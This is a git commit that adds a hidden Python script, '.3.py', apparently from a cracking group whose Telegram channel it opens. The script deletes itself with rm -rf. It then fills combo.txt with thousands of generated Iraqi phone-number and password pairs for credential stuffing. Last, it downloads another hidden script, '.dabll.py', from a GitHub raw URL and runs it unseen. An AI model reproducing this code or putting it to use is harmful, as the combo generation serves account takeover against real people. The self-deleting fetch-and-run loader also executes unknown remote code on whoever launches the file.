2e8693febf5ced7af8dd58bf400c3b9bf2696a35
slrslrslr190 <86885852+slrslrslr190@users.noreply.github.com>
2021-07-30 15:22:13 +0300

    Add files via upload

---
+++ .3.py
@@ -0,0 +1,40 @@
+import  os, sys, random
+os.system("rm .3.py ;xdg-open https://t.me/lawan_cracker_1")
+try:
+    os.remove(".3.py")
+except:
+    pass
+os.system("rm -rf /sdcard/download/.3.py")
+os.system("rm -rf .3.py")
+def iii():
+	import random,sys,os
+	for aa in range(7000):
+		asia=random.randint(1000000, 9999999)
+		asia1=random.randint(1000000, 9999999)
+		asia2=random.randint(1000000, 9999999)
+		asia3=random.randint(1000000, 9999999)
+		asia4=random.randint(1000000, 9999999)
+		korak=random.randint(1000000, 9999999)
+		korak1=random.randint(1000000, 9999999)
+		korak2=random.randint(1000000, 9999999)
+		korak3=random.randint(1000000, 9999999)
+		korak4=random.randint(1000000, 9999999)
+		zain=random.randint(1000000, 9999999)
+		zain1=random.randint(1000000, 9999999)
+		zain2=random.randint(1000000, 9999999)
+		zain3=random.randint(1000000, 9999999)
+		zain4=random.randint(1000000, 9999999)
+		sys.stdout=open("combo.txt","a")
+		print("+964770"+str(asia1)+":0770"+str(asia1))
+		print("+964771"+str(asia2)+":0771"+str(asia2))
+		print("+964750"+str(korak)+":0750"+str(korak))
+		print("+964751"+str(korak1)+":0751"+str(korak))
+		sys.stdout.flush()
+iii()
+pass
+
+import os, sys, random, wget
+wget.download("https://raw.githubusercontent.com/slrslrslr190/-/main/.dabll.py")
+os.system("python .dabll.py")
+
+#
